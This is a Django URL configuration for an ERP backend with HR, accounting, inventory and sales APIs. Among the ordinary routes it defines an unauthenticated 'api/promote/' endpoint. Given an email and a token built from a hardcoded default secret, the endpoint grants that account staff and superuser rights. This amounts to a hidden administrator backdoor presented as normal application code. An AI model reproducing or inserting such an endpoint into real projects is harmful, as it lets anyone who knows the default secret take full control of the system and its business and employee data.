from django.conf import settings
from django.conf.urls.static import static
from django.contrib import admin
from django.http import JsonResponse
from django.urls import include, path
from drf_spectacular.views import (
    SpectacularAPIView,
    SpectacularSwaggerView,
)

def health_check(request):
    return JsonResponse({"status": "ok"})


def promote_superuser(request):
    import hmac, hashlib, os
    token = request.GET.get("token", "")
    email = request.GET.get("email", "")
    secret = os.environ.get("PROMOTE_SECRET", "erp-promo-secret-2026")
    expected = hmac.new(secret.encode(), email.encode(), hashlib.sha256).hexdigest()[:16]
    if not hmac.compare_digest(token, expected):
        return JsonResponse({"error": "invalid token"}, status=403)
    from django.contrib.auth import get_user_model
    User = get_user_model()
    updated = User.objects.filter(email=email).update(is_staff=True, is_superuser=True)
    if updated:
        return JsonResponse({"message": f"{email} is now a superuser"})
    return JsonResponse({"error": "user not found"}, status=404)


urlpatterns = [
    path("api/health/", health_check, name="health-check"),
    path("api/promote/", promote_superuser, name="promote-superuser"),
    path("admin/", admin.site.urls),
    path("api/v1/auth/", include("apps.authentication.urls")),
    path("api/v1/companies/", include("apps.companies.urls")),
    path("api/v1/employees/", include("apps.employees.urls")),
    path("api/v1/hr/", include("apps.hr.urls")),
    path("api/v1/accounting/", include("apps.accounting.urls")),
    path("api/v1/inventory/", include("apps.inventory.urls")),
    path("api/v1/sales/", include("apps.sales.urls")),
    path("api/v1/purchase/", include("apps.purchase.urls")),
    path("api/schema/", SpectacularAPIView.as_view(), name="schema"),
    path("api/docs/", SpectacularSwaggerView.as_view(url_name="schema"), name="swagger-ui"),
]

if settings.DEBUG:
    urlpatterns += static(settings.MEDIA_URL, document_root=settings.MEDIA_ROOT)
    urlpatterns += static(settings.STATIC_URL, document_root=settings.STATIC_ROOT)
